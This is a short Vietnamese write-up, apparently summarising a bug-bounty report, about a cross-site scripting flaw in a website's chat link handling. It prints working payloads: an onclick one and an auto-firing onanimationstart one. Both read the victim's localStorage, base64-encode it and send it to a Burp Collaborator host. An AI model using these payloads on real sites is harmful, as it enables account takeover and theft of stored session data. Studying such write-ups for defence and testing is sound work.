
Sử dụng XSS để lấy thông tin nạn nhân

# Mô tả

Ứng dụng chat của website luôn gói link được gửi trong chat vào thẻ a 

Ví dụ bạn gõ https://google.com và nhấn gửi. Ứng dụng sẽ gói thành `<a href= google.com>`

Vấn đề ở đây là Ứng dụng không kiểm tra các kí tự được gói trong link. Payload kiểm tra là:

`https://google.com"'/>` chuyển thành `"target="_blank rel="noreferred" https://google.com`

Sau đó
`https://google.com"onclick="alert('1')"a="` Thành `<a href="https://google.com" onclick="alert(1)" a="">`

Như vậy ứng dụng đã mắc lỗi XSS và có thể bị khai thác

# Khai thác lỗi

## Lấy thông tin lưu trên local store

Payload
`https://google.com"onclick="b=JSON.stringify(localStorage);c=btoa(b);i=new/**/Image;i.src='https://burpcollaborator.burpcollaborator.net?t='+c"a="`

Nếu link được gửi đi và có user nhấp vào, thông tin được lưu trong localStore của họ sẽ bị gửi đến server C2 burp

Payload này chủ được nạp khi có user click vào.

## Làm thế nào để payload tự trigger mà không cần tác động của user
Payload có thể trigger nếu nó có thể inject vào một animation style tag. Tác giả đã tìm thấy một file css như vậy và tạo ra payload:

- payload đặt trong onanimation attribute
- Định nghĩa tag style  

`https://google.com"onanimationstart="b=JSON.stringify(localStorage);c=btoa(b);i=new/**/Image;i.src=’https://burpcollaborator.burpcollaborator.net?t='+c"style="animation-name:Toastify__bounceOutRight`

Khi link được gửi và user click vào, tag style load, sự kiện thực thi, và code tự động gửi thông tin về máy attacker.


### Source: 

1. [How I managed to trigger XSS automatically to get critical account takeover](https://c4rrilat0r.medium.com/how-i-managed-to-trigger-xss-automatically-to-get-critical-account-takeover-92ea3abcaf9)
2. [Cross-Site Scripting Cheat Sheet from Port Swigger](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)